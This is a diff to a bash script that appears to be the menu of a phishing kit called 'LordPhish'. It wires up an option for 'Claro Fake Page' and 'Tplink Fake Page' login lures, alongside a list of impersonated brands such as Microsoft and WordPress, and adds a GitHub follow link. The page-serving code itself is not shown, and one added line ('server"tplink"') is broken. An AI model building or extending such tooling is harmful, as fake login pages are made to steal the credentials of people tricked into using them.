@@ -103,11 +103,11 @@ printf "\e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;96m Wordpress\e[0m      
 
 printf "\e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;96m Microsoft\e[0m      \e[1;92m[\e[0m\e[1;77m33\e[0m\e[1;92m]\e[0m\e[1;96m devianART   \e[0m     \e[1;92m[\e[0m\e[1;77m50\e[0m\e[1;92m]\e[0m\e[1;96m Cod-Mobile\e[0m\n"
 
-printf "\e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;96m IGFollowers\e[0m    \e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;96m StackOverflow\e[0m     \e[1;92m[\e[0m\e[1;77m51\e[0m\e[1;92m]\e[0m\e[1;96m operadoras\e[0m \n"
+printf "\e[1;92m[\e[0m\e[1;77m17\e[0m\e[1;92m]\e[0m\e[1;96m IGFollowers\e[0m    \e[1;92m[\e[0m\e[1;77m34\e[0m\e[1;92m]\e[0m\e[1;96m StackOverflow\e[0m    \e[1;92m[\e[0m\e[1;77m51\e[0m\e[1;92m]\e[0m\e[1;96m operadoras\e[0m \n"
 
 printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;91m Custom \e[0m        \e[1;92m[\e[0m\e[1;77mY\e[0m\e[1;92m]\e[0m\e[1;91m Youtube channel \e[0m  \e[1;92m[\e[0m\e[1;77mT\e[0m\e[1;92m]\e[0m\e[1;91m Telegram\e[0m \n"     
 
-printf "\e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m \n"
+printf "\e[1;92m[\e[0m\e[1;77m00\e[0m\e[1;92m]\e[0m\e[1;91m Exit\e[0m           \e[1;92m[\e[0m\e[1;77mF\e[0m\e[1;92m]\e[0m\e[1;91m Follow me one git hub\e[0m\n"
 
 read -p $' \e[1;31m[\e[0m\e[1;77m~\e[0m\e[1;31m]\e[0m\e[1;92m Select an option: \e[0m\e[1;96m\en' menu_option
 
@@ -312,6 +312,9 @@ elif [[ $menu_option == 50 ]]; then
 server="Codm"
 start1
 
+elif [[ $menu_option == 51 ]]; then
+operadoras
+
 elif [[ $menu_option == 0 || $menu_option == 00 ]]; then
 sleep 1
 printf "\e[0m\n"
@@ -330,6 +333,10 @@ am start -a android.intent.action.VIEW https://youtube.com/channel/UCxTE4c-xqpAq
 elif [[ $menu_option == T ]]; then 
 banner
 am start -a android.intent.action.VIEW https://t.me/Ch33chSec
+
+elif [[ $menu_option == F ]]; then
+banner
+am start -a android.intent.action.VIEW https://github.com/Ch33chOficial
 
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
@@ -426,13 +433,13 @@ operadoras () {
     banner
     printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;96m Claro Fake Page\e[0m\n"
     printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;96m Tplink Fake Page\e[0m\n"
-    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' google_menu
+    read -p $'\n\e[41m\e[1;36mLordPhish>>\e[0m\e[1;32m \en' op_menu
     
-if [[ $google_menu == 1 ]]; then
+if [[ $op_menu == 1 ]]; then
 server="claro"
 start1
     
-elif [[ $google_menu == 2 ]]; then
+elif [[ $op_menu == 2 ]]; then
 server"tplink"
 start1
 
